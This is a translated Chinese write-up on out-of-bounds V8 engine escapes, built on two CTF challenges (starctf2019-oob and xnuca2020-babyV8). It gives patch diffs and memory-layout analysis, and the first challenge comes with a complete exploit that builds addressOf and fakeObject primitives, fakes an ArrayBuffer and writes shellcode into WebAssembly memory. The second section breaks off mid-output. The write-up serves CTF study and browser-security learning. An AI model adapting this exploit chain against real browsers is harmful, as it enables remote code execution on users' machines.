# OOB类型的v8逃逸总结
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
总结几道OOB类型的v8逃逸的利用方法，它们大多的利用手法都极为相似。
## 0x01 前置知识
OOB即缓冲区溢出，在v8中的OOB漏洞是比较容易利用的，一般的步骤就是利用OOB修改`ArrayBuffer`的`backing_store`和`byteLength`实现任意地址读写，也可以直接`OOB`读取和修改对象的`MAP`，构造`addressOf`和`fakeObject`原语。
## 0x02 普通OOB
###  0x02.00 starctf2019-oob
####  patch分析
    diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
    index b027d36..ef1002f 100644
    --- a/src/bootstrapper.cc
    +++ b/src/bootstrapper.cc
    @@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle global_object,
                               Builtins::kArrayPrototypeCopyWithin, 2, false);
         SimpleInstallFunction(isolate_, proto, "fill",
                               Builtins::kArrayPrototypeFill, 1, false);
    +    SimpleInstallFunction(isolate_, proto, "oob",
    +                          Builtins::kArrayOob,2,false);
         SimpleInstallFunction(isolate_, proto, "find",
                               Builtins::kArrayPrototypeFind, 1, false);
         SimpleInstallFunction(isolate_, proto, "findIndex",
    diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
    index 8df340e..9b828ab 100644
    --- a/src/builtins/builtins-array.cc
    +++ b/src/builtins/builtins-array.cc
    @@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
       return *final_length;
     }
     }  // namespace
    +BUILTIN(ArrayOob){
    +    uint32_t len = args.length();
    +    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
    +    Handle receiver;
    +    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +            isolate, receiver, Object::ToObject(isolate, args.receiver()));
    +    Handle array = Handle::cast(receiver);
    +    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
    +    uint32_t length = static_cast(array->length()->Number());
    +    if(len == 1){
    +        //read
    +        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
    +    }else{
    +        //write
    +        Handle value;
    +        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +                isolate, value, Object::ToNumber(isolate, args.at(1)));
    +        elements.set(length,value->Number());
    +        return ReadOnlyRoots(isolate).undefined_value();
    +    }
    +}
     BUILTIN(ArrayPush) {
       HandleScope scope(isolate);
    diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
    index 0447230..f113a81 100644
    --- a/src/builtins/builtins-definitions.h
    +++ b/src/builtins/builtins-definitions.h
    @@ -368,6 +368,7 @@ namespace internal {
       TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
       /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
       TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
    +  CPP(ArrayOob)                                                                \
                                                                                    \
       /* ArrayBuffer */                                                            \
       /* ES #sec-arraybuffer-constructor */                                        \
    diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
    index ed1e4a5..c199e3a 100644
    --- a/src/compiler/typer.cc
    +++ b/src/compiler/typer.cc
    @@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
           return Type::Receiver();
         case Builtins::kArrayUnshift:
           return t->cache_->kPositiveSafeInteger;
    +    case Builtins::kArrayOob:
    +      return Type::Receiver();
         // ArrayBuffer functions.
         case Builtins::kArrayBufferIsView:
可以看到，patch为`Array`类型增加了一个新的函数叫`oob`，其具体处理的逻辑在`BUILTIN(ArrayOob)`函数里，当参数个数为1个时，进行读操作
    +        //read
    +        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
可以看到读操作溢出了一个单位，因为下标是以0开始的，同理当参数个数为2个时，进行写操作
      elements.set(length,value->Number());
其中`BUILTIN(ArrayOob)`的第一个参数为`Array`本身，因此从`js`层面来看，oob接收的参数要么为0个要么为1个。
####  漏洞利用
要利用该漏洞，我们考虑使用`var a =
[1.1,2.2,3.3]`这种`DOUBLE_ELEMENTS`类型的数组，因为这种数组里的数据是`unboxed`的，即没有包装为`HeapNumber`，elements里存的就是真值。在大多数情况下，这种类型的数组其elements在内存里的位置正好位于`Array`对象的上方，没有间隔。  
测试以下代码，用gdb调试
    var a = [1.1,2.2];
    %DebugPrint(a);
    %SystemBreak();
查看elements里，2.2这个数据后方是什么，可以发现是`Array`对象的MAP，而在v8里，如果能够控制对象MAP值，那么就可以造成类型混淆，轻松构造`addressOf`和`fakeObject`原语
并且可以看到这个版本的v8没有`compression
pointer`机制，因此`addressOf`获得的就是对象的完整地址，然后可以轻松伪造一个`ArrayBuffer`实现任意地址读写，写wasm的shellcode区域。  
exp
    var a = [1.1];
    var unboxed_double_map = a.oob();
    var obj = {};
    var b = [obj];
    var obj_element_map = b.oob();
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    function i2f64(value) {
       dv.setBigUint64(0,BigInt(value),true);
       return dv.getFloat64(0,true);
    }
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return dv.getBigUint64(0,true);
    }
    function addressOf(obj) {
       b[0] = obj;
       b.oob(unboxed_double_map);
       var addr = u64f(b[0]) - 0x1n;
       b.oob(obj_element_map);
       return addr;
    }
    function fakeObject(addr) {
       a[0] = i2f64(addr + 1n);
       a.oob(obj_element_map);
       var mobj = a[0];
       a.oob(unboxed_double_map);
       return mobj;
    }
    const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
    const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
    var faker_addr = addressOf(faker);
    //alert('wasm='+addressOf(wasmInstance).toString(16));
    wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x88n;
    var element_addr = faker_addr - 0x50n;
    //print('element_addr=' + element_addr.toString(16));
    //fake a ArrayBuffer's Map
    faker[0] = i2f64(0n);
    faker[1] = i2f64(0x1900042317080808n);
    faker[2] = i2f64(0x00000000084003ffn);
    faker[3] = i2f64(0);
    //faker a ArrayBuffer
    faker[4] = i2f64(element_addr+0x1n); //map
    faker[5] = i2f64(0); //properties
    faker[6] = i2f64(0); //elements
    faker[7] = p64f(0xffffffff,0); //length
    faker[8] = i2f64(wasm_shellcode_ptr_addr);
    faker[9] = 0x2;
    var arb_ArrayBuffer = fakeObject(element_addr+0x20n);
    var adv = new DataView(arb_ArrayBuffer);
    var wasm_shellcode_addr = adv.getBigUint64(0,true);
    //alert('wasm_shellcode_addr=' + wasm_shellcode_addr.toString(16));
    faker[8] = i2f64(wasm_shellcode_addr);
    //替换wasm的shellcode
    for (var i=0;i
###  0x02.01 xnuca2020-babyV8
####  patch分析
    diff --git a/src/codegen/code-stub-assembler.cc b/src/codegen/code-stub-assembler.cc
    index 16fd384..8bf435a 100644
    --- a/src/codegen/code-stub-assembler.cc
    +++ b/src/codegen/code-stub-assembler.cc
    @@ -2888,7 +2888,7 @@ TNode CodeStubAssembler::BuildAppendJSArray(ElementsKind kind,
           [&](TNode arg) {
             TryStoreArrayElement(kind, &pre_bailout, elements, var_length.value(),
                                  arg);
    -        Increment(&var_length);
    +        Increment(&var_length, 3);
           },
           first);
       {
查找该函数的上层调用，发现其在`TF_BUILTIN(ArrayPrototypePush,
CodeStubAssembler)`函数里被调用，而`TF_BUILTIN(ArrayPrototypePush,
CodeStubAssembler)`函数是js中的`Array.prototype.push`函数的具体实现，因此该漏洞与`push`操作有关。  
patch以后，部分关键代码如下
      // Resize the capacity of the fixed array if it doesn't fit.
      TNode first = arg_index->value();
      Node* growth = IntPtrToParameter(
          IntPtrSub(UncheckedCast(args->GetLength(INTPTR_PARAMETERS)),
                    first),
          mode);
      PossiblyGrowElementsCapacity(mode, kind, array, var_length.value(),
                                   &var_elements, growth, &pre_bailout);
      // Push each argument onto the end of the array now that there is enough
      // capacity.
      CodeStubAssembler::VariableList push_vars({&var_length}, zone());
      Node* elements = var_elements.value();
      args->ForEach(
          push_vars,
          [this, kind, mode, elements, &var_length, &pre_bailout](Node* arg) {
            TryStoreArrayElement(kind, mode, &pre_bailout, elements,
                                 var_length.value(), arg);
            Increment(&var_length, 3, mode);
          },
          first, nullptr);
      {
        TNode length = ParameterToTagged(var_length.value(), mode);
        var_tagged_length = length;
        StoreObjectFieldNoWriteBarrier(array, JSArray::kLengthOffset, length);
        Goto(&success);
      }
其中看到，在存储数据之前，先进行了扩容，但这个扩容的计算是根据元素的个数来算的，而patch后，原本每次push一个数据，末尾指针加1，现在加了3
    Increment(&var_length, 3, mode);
最后，数据都push完成后，将var_length的值作为Array的length，这就导致了数组的length大于其本身elements的大小，导致了oob。
####  漏洞利用
首先测试如下代码，用gdb调试
    var arr = [];
    arr[0] = 1.1;
    arr.push(1.1,2.2,3.3,4.4,5.5,6.6);
    %DebugPrint(arr);
    %SystemBreak();
可以看到arr的长度为19
为了验证是否溢出，我们用如下代码进一步测试
    var arr = [];
    arr[0] = 1.1;
    arr.push(1.1,2.2,3.3,4.4,5.5,6.6);
    var arr2 = [1.1,2.2];
    %DebugPrint(arr);
    %DebugPrint(arr2);
    %SystemBreak();
结果如下
    0x114d0808819d 